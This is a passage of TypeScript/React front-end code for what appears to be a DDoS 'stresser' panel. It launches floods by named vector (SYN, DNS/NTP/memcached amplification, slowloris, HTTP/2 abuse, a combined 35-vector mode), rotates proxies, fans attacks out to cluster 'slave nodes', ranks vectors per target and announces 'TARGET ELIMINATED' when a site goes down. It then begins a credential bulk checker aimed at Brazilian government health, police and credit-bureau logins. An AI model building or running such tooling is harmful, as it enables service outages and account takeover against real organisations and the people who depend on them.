      const rem = Math.max(0, durationRef.current - elapsed);
      setTimeRemaining(Math.round(rem));
    }, 1000);
    return () => clearInterval(iv);
  }, [isRunning]);

  useEffect(() => { soundRef.current = soundEnabled; }, [soundEnabled]);
  useEffect(() => { setEntered(true); }, []);
  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
  }, [logs]);

  // ── Auto-reconnect checker job on page load ───────────────────────────────
  // If the user closed the browser mid-check, the job is still running on the
  // server. On the next page load we verify the job is still alive and
  // subscribe to its SSE stream automatically — no button click required.
  useEffect(() => {
    const savedId = localStorage.getItem("lb-checker-job-id");
    if (!savedId) return;
    let cancelled = false;
    (async () => {
      try {
        const r = await fetch(`${BASE}/api/checker/jobs`);
        if (!r.ok || cancelled) return;
        const jobs = await r.json() as Array<{ id: string; status: string }>;
        const job  = jobs.find(j => j.id === savedId);
        if (!job || cancelled) return;
        if (job.status === "running") {
          // Auto-reconnect — fires the same function the user would click manually
          setCredJobId(savedId);
          void reconnectToCheckerJob(savedId);
        } else {
          // Job finished while we were away — just clean up the stale key
          localStorage.removeItem("lb-checker-job-id");
          setCredJobId(null);
        }
      } catch { /* ignore — server may still be starting */ }
    })();
    return () => { cancelled = true; };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /* ── Proxy stats — SSE real-time + polling fallback ── */
  useEffect(() => {
    let es: EventSource | null = null;
    let fallbackInterval: ReturnType<typeof setInterval> | null = null;
    let autoRefreshTimer: ReturnType<typeof setTimeout> | null = null;
    let sseConnected = false;

    // ── initial fetch of full proxy list (runs once) ──────────────────────
    async function fetchProxyList() {
      try {
        const r = await fetch(`${BASE}/api/proxies`);
        const d = await r.json() as {
          count: number; publicCount?: number; residentialCount?: number;
          proxies: ProxyEntry[]; residential?: ResidentialInfo | null;
        };
        if (d.proxies?.length > 0) setProxies(d.proxies);
        setProxyLiveCount(d.count);
        if (d.residential)             setResidentialInfo(d.residential);
        if ((d.residentialCount ?? 0) > 0) setResidentialCount(d.residentialCount ?? 0);
      } catch { /* ignore — API may be starting */ }
    }

    // ── SSE handler — called for every event ──────────────────────────────
    function applySnapshot(raw: string) {
      try {
        const d = JSON.parse(raw) as {
          proxyCount: number; fetching: boolean;
          residentialCount: number; residential: ResidentialInfo | null;
          activeAttacks?: number; ts: number;
        };
        setProxyLiveCount(d.proxyCount);
        setProxyIsFetching(d.fetching);
        if (d.residentialCount > 0) {
          setResidentialCount(d.residentialCount);
          if (d.residential) setResidentialInfo(d.residential);
        } else {
          setResidentialInfo(null);
          setResidentialCount(0);
        }
      } catch { /* malformed event */ }
    }

    // ── Connect SSE ───────────────────────────────────────────────────────
    function connectSSE() {
      if (typeof EventSource === "undefined") { startFallbackPolling(); return; }
      es = new EventSource(`${BASE}/api/events`);

      es.addEventListener("snapshot", (e: MessageEvent) => {
        sseConnected = true;
        applySnapshot((e as MessageEvent).data as string);
        // If SSE is working, stop fallback polling
        if (fallbackInterval) { clearInterval(fallbackInterval); fallbackInterval = null; }
      });

      es.addEventListener("update", (e: MessageEvent) => {
        applySnapshot((e as MessageEvent).data as string);
      });

      es.addEventListener("connected", () => { sseConnected = true; });

      es.onerror = () => {
        // SSE failed — fall back to polling
        if (!sseConnected) {
          es?.close();
          es = null;
          startFallbackPolling();
        }
      };
    }

    // ── Fallback polling (10s) ────────────────────────────────────────────
    function startFallbackPolling() {
      if (fallbackInterval) return;
      async function poll() {
        try {
          const [r, rs] = await Promise.all([
            fetch(`${BASE}/api/proxies/count`),
            fetch(`${BASE}/api/proxies/stats`),
          ]);
          const d  = await r.json() as { count: number; fetching: boolean; lastFetch: number };
          const ds = await rs.json() as { count: number; residentialCount?: number; residential?: ResidentialInfo | null };
          setProxyLiveCount(d.count);
          setProxyIsFetching(d.fetching);
          if (d.lastFetch) setProxyLastRefresh(d.lastFetch);
          if ((ds.residentialCount ?? 0) > 0) {
            setResidentialCount(ds.residentialCount ?? 0);
            if (ds.residential) setResidentialInfo(prev => prev ?? ds.residential!);
          } else if (ds.residentialCount === 0) {
            setResidentialInfo(null); setResidentialCount(0);
          }
        } catch { /* ignore */ }
      }
      void poll();
      fallbackInterval = setInterval(poll, 10_000);
    }

    // ── Boot ──────────────────────────────────────────────────────────────
    void fetchProxyList();
    connectSSE();

    // If SSE doesn't connect within 5s, start fallback
    const sseTimeout = setTimeout(() => {
      if (!sseConnected) { es?.close(); es = null; startFallbackPolling(); }
    }, 5_000);

    // Re-fetch full proxy list every 10 minutes
    autoRefreshTimer = setTimeout(function triggerRefresh() {
      void fetchProxyList();
      autoRefreshTimer = setTimeout(triggerRefresh, 10 * 60 * 1000);
    }, 10 * 60 * 1000);

    return () => {
      es?.close();
      if (fallbackInterval) clearInterval(fallbackInterval);
      if (autoRefreshTimer) clearTimeout(autoRefreshTimer);
      clearTimeout(sseTimeout);
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /* ── Node health polling — updates every 5s when cluster nodes are configured ── */
  useEffect(() => {
    if (clusterNodes.length === 0) { setNodeHealth([]); return; }
    const poll = async () => {
      try {
        const r = await fetch(`${BASE}/api/cluster/status`);
        if (r.ok) {
          const d = await r.json() as { nodes: { url: string; online: boolean; latencyMs: number; cpus?: number; freeMem?: number }[] };
          setNodeHealth(d.nodes ?? []);
        }
      } catch { /* ignore — API may be starting */ }
    };
    poll();
    const iv = setInterval(poll, 5000);
    return () => clearInterval(iv);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [clusterNodes.length]);

  /* Sync current packets/bytes to refs */
  useEffect(() => {
    if (!currentAttack) return;
    currentPacketsRef.current = currentAttack.packetsSent ?? 0;
    currentBytesRef.current   = currentAttack.bytesSent   ?? 0;
  }, [currentAttack]);

  /* Per-second metric calculation — polls /live endpoint at 500ms for real-time stats.
   * PPS is computed CLIENT-SIDE from totalPackets delta to avoid server-side timer drift.
   * EMA (α=0.35) smooths spikes so the display never "freezes" between server windows. */
  useEffect(() => {
    if (!isRunning) {
      setPps(0); setBps(0);
      prevLivePktsRef.current  = null;
      prevLiveBytesRef.current = null;
      prevLivePollMs.current   = null;
      emaPpsRef.current = 0;
      emaBpsRef.current = 0;
      return;
    }
    // Reset EMA + prev snapshot on attack start
    prevLivePktsRef.current  = null;
    prevLiveBytesRef.current = null;
    prevLivePollMs.current   = null;
    emaPpsRef.current = 0;
    emaBpsRef.current = 0;
    let lastLogMs = 0;
    const EMA_ALPHA = 0.35;

    const iv = setInterval(async () => {
      if (currentAttackId === null) return;
      const pollNow = Date.now();

      try {
        const r = await fetch(`${BASE}/api/attacks/${currentAttackId}/live`);
        if (!r.ok) return;
        const live = await r.json() as { pps: number; bps: number; totalPackets: number; totalBytes: number; conns: number; running: boolean };

        // Sync accumulator refs so progress bar + final count stay accurate
        if (live.totalPackets > currentPacketsRef.current) currentPacketsRef.current = live.totalPackets;
        if (live.totalBytes   > currentBytesRef.current)  currentBytesRef.current   = live.totalBytes;

        // Update live conn counter
        if (live.conns > 0) setActiveConns(live.conns);

        // Client-side PPS/BPS delta — immune to server-side 1s timer drift
        let rawPps = 0;
        let rawBps = 0;
        if (prevLivePktsRef.current !== null && prevLivePollMs.current !== null) {
          const dt = (pollNow - prevLivePollMs.current) / 1000; // seconds
          if (dt > 0) {
            rawPps = Math.max(0, (live.totalPackets - prevLivePktsRef.current) / dt);
            rawBps = Math.max(0, (live.totalBytes   - (prevLiveBytesRef.current ?? 0)) / dt);
          }
        }
        prevLivePktsRef.current  = live.totalPackets;
        prevLiveBytesRef.current = live.totalBytes;
        prevLivePollMs.current   = pollNow;

        // EMA smoothing — eliminates the brief 0-dip when server window resets
        const smoothPps = rawPps > 0
          ? EMA_ALPHA * rawPps + (1 - EMA_ALPHA) * emaPpsRef.current
          : emaPpsRef.current * 0.8; // decay slowly instead of dropping to 0
        const smoothBps = rawBps > 0
          ? EMA_ALPHA * rawBps + (1 - EMA_ALPHA) * emaBpsRef.current
          : emaBpsRef.current * 0.8;
        emaPpsRef.current = smoothPps;
        emaBpsRef.current = smoothBps;

        const displayPps = Math.round(smoothPps);
        const displayBps = Math.round(smoothBps);

        setPps(displayPps);
        setBps(displayBps);
        setPpsHistory(prev => [...prev.slice(-59), displayPps]);
        setBpsHistory(prev => [...prev.slice(-59), displayBps]);
        if (displayPps > peakPpsRef.current) { peakPpsRef.current = displayPps; setPeakPps(displayPps); }
        if (displayBps > peakBpsRef.current) { peakBpsRef.current = displayBps; setPeakBps(displayBps); }

        // Log at most once per 2s
        const now = Date.now();
        if (displayPps > 0 && now - lastLogMs >= 2000) {
          lastLogMs = now;
          const n = fmtNum(displayPps);
          const t = targetRef.current;
          let msgs: ((t: string, n: string) => string)[];
          const H2_LOG_SET  = new Set(["http2-flood","h2-settings-storm","hpack-bomb","http2-continuation","http-pipeline","http2-priority-storm","large-header-bomb","h2-ping-storm","waf-bypass","quic-flood"]);
          const AMP_LOG_SET = new Set(["dns-amp","ntp-amp","mem-amp","ssdp-amp","icmp-flood"]);
          const TLS_LOG_SET = new Set(["tls-renego","ssl-death","keepalive-exhaust","http-smuggling"]);
          const CONN_LOG_SET= new Set(["conn-flood","ws-flood","rudy-v2"]);
          const SLOW_LOG_SET= new Set(["slowloris","slow-read","rudy"]);
          const HTTP_LOG_SET= new Set(["http-flood","http-bypass","graphql-dos","cache-poison","xml-bomb","range-flood","app-smart-flood","http2-flood"]);
          const TCP_LOG_SET = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
          const UDP_LOG_SET = new Set(["udp-flood","udp-bypass"]);
          if (method === "geass-override")       msgs = LOG_MSGS_GEASS;
          else if (H2_LOG_SET.has(method))       msgs = LOG_MSGS_H2;
          else if (SLOW_LOG_SET.has(method))     msgs = LOG_MSGS_SLOW;
          else if (CONN_LOG_SET.has(method))     msgs = LOG_MSGS_CONN;
          else if (TLS_LOG_SET.has(method))      msgs = LOG_MSGS_TLS;
          else if (AMP_LOG_SET.has(method))      msgs = LOG_MSGS_AMP;
          else if (HTTP_LOG_SET.has(method))     msgs = LOG_MSGS_HTTP;
          else if (TCP_LOG_SET.has(method))      msgs = LOG_MSGS_TCP;
          else if (UDP_LOG_SET.has(method))      msgs = LOG_MSGS_UDP;
          else                                   msgs = LOG_MSGS_HTTP;
          addLog(msgs[Math.floor(Math.random() * msgs.length)](t, n), "info");
          if (soundRef.current) playTone("tick");
        }
      } catch { /* ignore network blips */ }
    }, 500);
    return () => clearInterval(iv);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRunning, method, addLog, currentAttackId]);

  /* Progress bar */
  useEffect(() => {
    if (!isRunning || startTimeRef.current === null) return;
    const iv = setInterval(() => {
      if (startTimeRef.current === null) return;
      const elapsed = (Date.now() - startTimeRef.current) / 1000;
      const pct = Math.min((elapsed / durationRef.current) * 100, 100);
      setProgress(pct);
      if (pct >= 100) {
        setIsRunning(false); isRunningRef.current = false;
        setProgress(100); setPps(0); setBps(0);
        setLastAtkPkts(currentPacketsRef.current);
        setLastAtkBytes(currentBytesRef.current);
        addLog(`👁 Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
        if (soundRef.current) playTone("stop");
        if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
        // Save to attack history for comparison chart
        const histEntry: AttackHistoryItem = {
          target: targetRef.current,
          method,
          pps: Math.round(currentPacketsRef.current / Math.max(durationRef.current, 1)),
          bytesSent: currentBytesRef.current,
          duration: durationRef.current,
          ts: Date.now(),
        };
        setAttackHistory(prev => {
          const updated = [histEntry, ...prev].slice(0, 10);
          localStorage.setItem("lb-attack-history", JSON.stringify(updated));
          return updated;
        });
        refetchStats(); refetchHistory();
        clearInterval(iv);
      }
    }, 500);
    return () => clearInterval(iv);
  }, [isRunning, addLog, refetchStats, refetchHistory]);

  /* Target monitoring — with latency tracking and consecutive-fail guard */
  useEffect(() => {
    if (!isRunning || !targetRef.current) return;
    let cancelled = false;

    const checkTarget = async () => {
      if (!isRunningRef.current || cancelled) return;
      try {
        const urlToCheck = targetRef.current;
        const res = await fetch(`${BASE}/api/check`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: urlToCheck }),
        });
        const data: CheckResult = await res.json();
        if (cancelled) return;

        // Track probe latency for sparkline + log significant spikes
        if (data.responseTime > 0) {
          setLatencyHistory(prev => {
            const next = [...prev.slice(-29), data.responseTime];
            if (next.length >= 4 && data.up) {
              const baseline = next.slice(0, -1).reduce((a, b) => a + b, 0) / (next.length - 1);
              const pct = Math.round(((data.responseTime - baseline) / baseline) * 100);
              if (pct >= 300) addLog(`🔥 LATENCY CRITICAL: ${data.responseTime}ms (+${pct}%) — server on the edge!`, "error");
              else if (pct >= 80) addLog(`⚠ Latency spike: ${data.responseTime}ms (+${pct}%) — server degrading...`, "warn");
            }
            return next;
          });
        }

        const prev = targetStatusRef.current;

        if (data.up) {
          consecutiveFailsRef.current = 0;
          targetStatusRef.current = "online";
          setTargetStatus("online");
          if (prev === "offline") {
            addLog(`⚠ Target RECOVERED: HTTP ${data.status} ${data.statusText} (${data.responseTime}ms) — Geass broken`, "warn");
          } else if (prev === "unknown") {
            addLog(`👁 Target baseline: ONLINE — HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`, "info");
          }
        } else {
          consecutiveFailsRef.current += 1;
          const fails = consecutiveFailsRef.current;
          if (fails < CONSECUTIVE_FAILS_TO_CONFIRM) {
            addLog(`⚠ Probe ${fails}/${CONSECUTIVE_FAILS_TO_CONFIRM}: ${urlToCheck} not responding (${data.responseTime}ms) — confirming...`, "warn");
          } else if (targetStatusRef.current !== "offline") {
            targetStatusRef.current = "offline";
            setTargetStatus("offline");
            addLog(`💥 TARGET DOWN! ${urlToCheck} — ${fails} consecutive probe failures — HTTP ${data.status || "OFFLINE"} (${data.responseTime}ms)`, "success");
            addLog(`💥 MISSION ACCOMPLISHED — TARGET ELIMINATED`, "success");
            addToast("geass", "MISSION ACCOMPLISHED", `${urlToCheck} — TARGET ELIMINATED`);
            recordDomainScore(urlToCheck, method, true);
            if (soundRef.current) playTone("kill");
            if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
            // ★ Fire kill webhook via /api/notify (T004)
            if (webhookUrl.trim()) {
              fetch(`${BASE}/api/notify`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  webhookUrl: webhookUrl.trim(),
                  event: "kill",
                  target: urlToCheck,
                  method,
                  attackId: currentAttackId,
                }),
              }).catch(() => { /**/ });
            }
          }
          if (prev === "unknown" && fails === 1) {
            addLog(`👁 Target baseline: OFFLINE — ${urlToCheck} not responding`, "warn");
          }
        }
      } catch { /* skip */ }
    };

    const initialTimeout = setTimeout(checkTarget, 3000);
    const iv = setInterval(checkTarget, 6000);

    return () => {
      cancelled = true;
      clearTimeout(initialTimeout);
      clearInterval(iv);
      setTargetStatus("unknown");
      targetStatusRef.current = "unknown";
      consecutiveFailsRef.current = 0;
      setLatencyHistory([]);
    };
  }, [isRunning, addLog]);

  /* currentAttack refetch is handled by refetchInterval — no manual setInterval needed */

  /* Live active-connection reset — conns are now fetched by the per-second metric effect above */
  const CONN_TRACKING_METHODS = new Set(["slowloris","conn-flood","geass-override","rudy","ws-flood","rudy-v2","tls-renego","ssl-death","http2-continuation","keepalive-exhaust","slow-read"]);
  useEffect(() => {
    if (!isRunning || !CONN_TRACKING_METHODS.has(method)) {
      setActiveConns(0);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRunning, method]);

  /* Cluster: poll slave nodes and aggregate stats */
  useEffect(() => {
    if (!isRunning || clusterAttackIds.length === 0) {
      setClusterTotalPkts(0); setClusterTotalBytes(0); return;
    }
    const iv = setInterval(async () => {
      const results = await Promise.allSettled(
        clusterAttackIds.map(({ node, id }) =>
          fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}`).then(r => r.json())
        )
      );
      let pkts = 0, bytes = 0;
      for (const r of results) {
        if (r.status === "fulfilled") { pkts += r.value.packetsSent ?? 0; bytes += r.value.bytesSent ?? 0; }
      }
      setClusterTotalPkts(pkts);
      setClusterTotalBytes(bytes);
    }, 1500);
    return () => clearInterval(iv);
  }, [isRunning, clusterAttackIds]);

  /* ── Actions ── */
  async function handleLaunch() {
    if (!target.trim()) {
      addLog("✕ No target — enter a URL or IP address.", "error");
      addToast("stop", "Target Vazio", "Digite uma URL ou IP antes de iniciar.");
      shakeTarget();
      return;
    }

    if (isRunning) {
      addLog("👁 Revoking Geass — halting strike...", "warn");
      if (currentAttackId !== null) {
        try {
          await stopAttack.mutateAsync({ id: currentAttackId });
          addLog("👁 Local node halted.", "success");
          addToast("stop", "Strike Halted", `${getDomainKey(targetRef.current)} — Geass revoked`);
          recordDomainScore(targetRef.current, method, targetStatus === "offline");
          if (soundRef.current) playTone("stop");
        } catch { addLog("✕ Failed to stop local attack.", "error"); }
      }
      // Stop extra targets
      for (const eid of extraAttackIds) {
        if (eid !== null) {
          try { await stopAttack.mutateAsync({ id: eid }); } catch { /* ignore */ }
        }
      }
      setExtraAttackIds([]);
      // Stop all cluster nodes
      if (clusterAttackIds.length > 0) {
        await Promise.allSettled(
          clusterAttackIds.map(({ node, id }) =>
            fetch(`${node.replace(/\/$/, "")}/api/attacks/${id}/stop`, { method: "POST" })
          )
        );
        addLog(`👁 Cluster halted — ${clusterAttackIds.length} slave node(s) disengaged.`, "warn");
        setClusterAttackIds([]);
      }
      setLastAtkPkts(currentPacketsRef.current + clusterTotalPkts);
      setLastAtkBytes(currentBytesRef.current + clusterTotalBytes);
      setIsRunning(false); isRunningRef.current = false;
      setProgress(0); setCurrentAttackId(null);
      setPps(0); setBps(0); setTargetStatus("unknown");
      if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
      refetchHistory(); refetchStats();
      return;
    }

    // Auto-detect port: HTTPS targets → 443, DNS → 53, else 80
    const isHttpsTarget = /^https:/i.test(target.trim());
    const portFromTarget = (() => {
      try { const u = new URL(target.trim()); return parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80); } catch { return isHttpsTarget ? 443 : 80; }
    })();
    const port = method.includes("dns") ? 53 : portFromTarget;
    if (method === "geass-override") {
      addLog(`👁 ABSOLUTE GEASS COMMAND — ARES OMNIVECT — target: ${target}`, "info");
      addLog(`  35-vector: H2RST+gRPC+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+ConnFlood+Slowloris+Pipeline+H2Storm+ICMP+DNS+NTP+Memc+SSDP+UDP+AppSmart+LargeHeader+H2Prio+DoH | ${threads} threads | ${duration}s`, "info");
    } else {
      addLog(`👁 Geass granted — target: ${target}`, "info");
      addLog(`  Vector: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${duration}s`, "info");
    }
    if (soundRef.current) playTone("start");
    if ("vibrate" in navigator) navigator.vibrate([200]);
    if (proxyUsable) {
      const httpN   = proxies.filter(p => p.type !== "socks5").length;
      const socks5N = proxies.filter(p => p.type === "socks5").length;
      addLog(`👁 Proxy rotation enabled — ${proxies.length} proxies [HTTP:${httpN} SOCKS5:${socks5N}] for ${method}`, "success");
    }

    try {
      const result = await createAttack.mutateAsync({
        data: { target: target.trim(), port, method, duration, threads, webhookUrl: webhookUrl.trim() || null },
      });
      setCurrentAttackId(result.id);
      setIsRunning(true); isRunningRef.current = true;
      if (method === "geass-override") { setGeassFlash(true); setTimeout(() => setGeassFlash(false), 1600); }
      targetRef.current = target.trim();
      startTimeRef.current = Date.now();
      durationRef.current = duration;
      currentPacketsRef.current = 0; currentBytesRef.current = 0;
      lastPacketsRef.current = 0;   lastBytesRef.current = 0;
      peakPpsRef.current = 0; peakBpsRef.current = 0;
      setProgress(0); setPps(0); setBps(0); setPeakPps(0); setPeakBps(0); setPpsHistory([]); setBpsHistory([]);
      setLastAtkPkts(0); setLastAtkBytes(0); setClusterAttackIds([]); setClusterTotalPkts(0); setClusterTotalBytes(0);
      const mi = methodInfo(method);
      addLog(`👁 Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
      addToast("launch", `Geass Activated`, `${method.toUpperCase()} → ${getDomainKey(target.trim())} [${duration}s]`);

      // Launch extra targets (multi-target mode)
      const activeExtras = extraTargets.filter(t => t.trim());
      if (activeExtras.length > 0) {
        const extraIds: (number | null)[] = [];
        for (const et of activeExtras) {
          try {
            const er = await createAttack.mutateAsync({
              data: { target: et.trim(), port, method, duration, threads: Math.max(1, Math.floor(threads * 0.5)), webhookUrl: null },
            });
            extraIds.push(er.id);
            addLog(`👁 Extra target launched [ID #${er.id}] → ${et}`, "success");
          } catch { extraIds.push(null); addLog(`✕ Extra target failed: ${et}`, "error"); }
        }
        setExtraAttackIds(extraIds);
      }

      // Fire to cluster nodes (with Smart LB if enabled)
      const activeCluster = clusterNodes.filter(n => n.trim());
      if (activeCluster.length > 0) {
        addLog(`👁 Broadcasting Geass to ${activeCluster.length} cluster node(s)${smartLB ? " [SMART LB]" : ""}...`, "info");
        const clusterResults = await Promise.allSettled(
          activeCluster.map((nodeUrl, nodeIdx) => {
            const assignedMethod = smartLB ? getSmartMethod(method, nodeIdx + 1) : method;
            return fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ target: target.trim(), port, method: assignedMethod, duration, threads, webhookUrl: null }),
            })
            .then(r => r.json())
            .then((d: { id: number }) => ({ node: nodeUrl.replace(/\/$/, ""), id: d.id, assignedMethod }));
          })
        );
        const confirmed = clusterResults
          .filter(r => r.status === "fulfilled")
          .map(r => (r as PromiseFulfilledResult<{ node: string; id: number; assignedMethod: string }>).value);
        const failed = activeCluster.length - confirmed.length;
        setClusterAttackIds(confirmed);
        if (smartLB && confirmed.length > 0) {
          addLog(`👁 CLUSTER ACTIVE [SMART LB]: ${confirmed.length}/${activeCluster.length} nodes — ${confirmed.map((c, i) => `Node${i+1}:${c.assignedMethod}`).join(", ")}`, "success");
        } else {
          addLog(`👁 CLUSTER ACTIVE: ${confirmed.length}/${activeCluster.length} nodes online${failed > 0 ? ` (${failed} failed)` : ""} — ${confirmed.length + 1}x power`, "success");
        }
        if (confirmed.length > 0 && soundRef.current) playTone("start");
      }

      saveFavorite(target.trim()); refetchHistory(); refetchStats();
    } catch { addLog("✕ Launch failed — check backend connection.", "error"); }
  }

  function saveFavorite(url: string) {
    setFavorites(prev => {
      if (prev.includes(url)) return prev;
      const next = [url, ...prev].slice(0, 10);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }
  function removeFavorite(url: string) {
    setFavorites(prev => {
      const next = prev.filter(f => f !== url);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }

  function saveNamedTarget() {
    const url   = target.trim();
    const label = newNameLabel.trim() || url;
    if (!url) return;
    setNamedTargets(prev => {
      const next = [{ url, label }, ...prev.filter(n => n.url !== url)].slice(0, 15);
      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
    });
    setNewNameLabel("");
    addLog(`👁 Named target saved: "${label}" → ${url}`, "success");
  }
  function removeNamedTarget(url: string) {
    setNamedTargets(prev => {
      const next = prev.filter(n => n.url !== url);
      localStorage.setItem("lb-named-targets", JSON.stringify(next)); return next;
    });
  }

  function saveUserPreset() {
    const label = newPresetLabel.trim();
    if (!label) { addLog("✕ Enter a preset name.", "error"); return; }
    const preset: UserPreset = {
      id:         `${Date.now()}`,
      label,
      method,
      packetSize,
      duration,
      delay,
      threads,
    };
    setUserPresets(prev => {
      const next = [preset, ...prev].slice(0, 12);
      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
    });
    setNewPresetLabel("");
    addLog(`👁 Custom preset saved: "${label}" — ${method.toUpperCase()}, ${threads}T, ${duration}s`, "success");
  }
  function deleteUserPreset(id: string) {
    setUserPresets(prev => {
      const next = prev.filter(p => p.id !== id);
      localStorage.setItem("lb-user-presets", JSON.stringify(next)); return next;
    });
  }
  function applyUserPreset(p: UserPreset) {
    setMethod(p.method); setPacketSize(p.packetSize);
    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
    addLog(`👁 Custom preset: "${p.label}" — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
    if (soundRef.current) playTone("tick");
  }

  function applyPreset(p: Preset) {
    setMethod(p.method); setPacketSize(p.packetSize);
    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
    addLog(`👁 Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
    if (soundRef.current) playTone("tick");
  }
  function addClusterNode() {
    const url = clusterInput.trim().replace(/\/$/, "");
    if (!url) return;
    const next = [...new Set([...clusterNodes, url])].slice(0, 20);
    setClusterNodes(next);
    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
    setClusterInput("");
    addLog(`👁 Cluster node added: ${url}`, "info");
  }
  function removeClusterNode(url: string) {
    const next = clusterNodes.filter(n => n !== url);
    setClusterNodes(next);
    localStorage.setItem("lb-cluster-nodes", JSON.stringify(next));
  }

  function handleClearLogs() { setLogs([mkLog("Terminal cleared.", "info")]); }
  function handleExportLogs() {
    const txt = logs.map(l => `[${new Date(l.ts).toISOString()}] [${l.type.toUpperCase()}] ${l.text}`).join("\n");
    const blob = new Blob([txt], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url;
    a.download = `lelouch-log-${Date.now()}.txt`; a.click();
    URL.revokeObjectURL(url);
    addLog("👁 Logs exported.", "success");
  }
  async function handleAnalyze() {
    const urlToAnalyze = target.trim();
    if (!urlToAnalyze) { addLog("✕ Enter a target URL or IP to analyze.", "error"); return; }
    setIsAnalyzing(true); setAnalyzeResult(null); setShowAnalyze(true);
    addLog(`👁 Intelligence gathering on ${urlToAnalyze}...`, "info");
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/analyze`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToAnalyze }),
      });
      const data: AnalyzeResult = await res.json();
      setAnalyzeResult(data);
      const best = data.recommendations[0];
      addLog(`👁 Analysis complete: ${data.recommendations.length} vectors ranked`, "success");
      if (data.serverLabel && data.serverType !== "unknown") {
        addLog(`👁 Server identified: ${data.serverLabel}${data.serverHeader ? ` (${data.serverHeader})` : ""}`, "info");
      }
      if (best) addLog(`👁 Best method: ${best.name} [Tier ${best.tier}] — score ${best.score}/100 — ${best.reason}`, "success");
      if (data.isCDN) addLog(`⚠ CDN detected (${data.cdnProvider}) — layer 7 attacks partially mitigated`, "warn");
      if (soundRef.current) playTone("check");
    } catch { addLog("✕ Analysis failed — check backend connection.", "error"); }
    setIsAnalyzing(false);
  }
  async function handleCheckSite() {
    const urlToCheck = checkerUrl.trim() || target.trim();
    if (!urlToCheck) { addLog("✕ Enter a URL to check.", "error"); return; }
    setIsChecking(true); setCheckerResult(null);
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/check`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToCheck }),
      });
      const data: CheckResult = await res.json();
      setCheckerResult(data);
      if (soundRef.current) playTone("check");
      addLog(
        data.up
          ? `👁 ${urlToCheck} → HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`
          : `✕ ${urlToCheck} → OFFLINE — ${data.statusText} (${data.responseTime}ms)`,
        data.up ? "success" : "error"
      );
    } catch { addLog("✕ Check failed — network error.", "error"); }
    setIsChecking(false);
  }

  /* ── Credential Bulk Checker helpers ── */
  interface CredTargetMeta { label: string; icon: string; category: string; logoUrl?: string; logoColor?: string; note?: string; }
  function gf(domain: string) { return `https://www.google.com/s2/favicons?domain=${domain}&sz=64`; }
  function si(slug: string, hex: string) { return `https://cdn.simpleicons.org/${slug}/${hex}`; }
  const CRED_TARGETS: Record<string, CredTargetMeta> = {
    // Gov / Saúde
    datasus:      { label: "DataSUS",        icon: "🏥", category: "Governo",           logoUrl: gf("datasus.gov.br"),      logoColor: "#1a6b3a", note: "user:pass" },
    sipni:        { label: "SIPNI",          icon: "💉", category: "Governo",           logoUrl: gf("sipni.saude.gov.br"),  logoColor: "#1565c0", note: "user:pass" },
    consultcenter:{ label: "ConsultCenter",  icon: "📋", category: "Governo",           logoColor: "#4527a0", note: "user:pass" },
    mind7:        { label: "Mind-7",         icon: "🧠", category: "Governo",           logoColor: "#283593", note: "user:pass" },
    serpro:       { label: "SERPRO",         icon: "🛡️", category: "Governo",           logoUrl: gf("serpro.gov.br"),       logoColor: "#1a237e", note: "user:pass" },
    sisreg:       { label: "SISREG III",     icon: "🏨", category: "Governo",           logoUrl: gf("sisregiii.saude.gov.br"), logoColor: "#00695c", note: "user:pass" },
    sinesp:       { label: "SINESP",         icon: "🚔", category: "Governo",           logoUrl: gf("sinesp.gov.br"),       logoColor: "#1b5e20", note: "user:pass" },
    sispes:       { label: "SISP-ES",        icon: "🏛️", category: "Governo",           logoColor: "#bf360c", note: "user:pass" },
    sigma:        { label: "SIGMA PC-MA",    icon: "🔵", category: "Governo",           logoColor: "#0d47a1", note: "user:pass" },
    // Finanças / Crédito
    credilink:    { label: "CrediLink",      icon: "💳", category: "Finanças",          logoColor: "#1976d2", note: "user:pass" },
    serasa:       { label: "Serasa Empr.",   icon: "📊", category: "Finanças",          logoUrl: gf("serasa.com.br"),       logoColor: "#e53935", note: "user:pass" },
    serasa_exp:   { label: "Serasa Exp.",    icon: "💼", category: "Finanças",          logoUrl: gf("serasa.com.br"),       logoColor: "#c62828", note: "user:pass" },
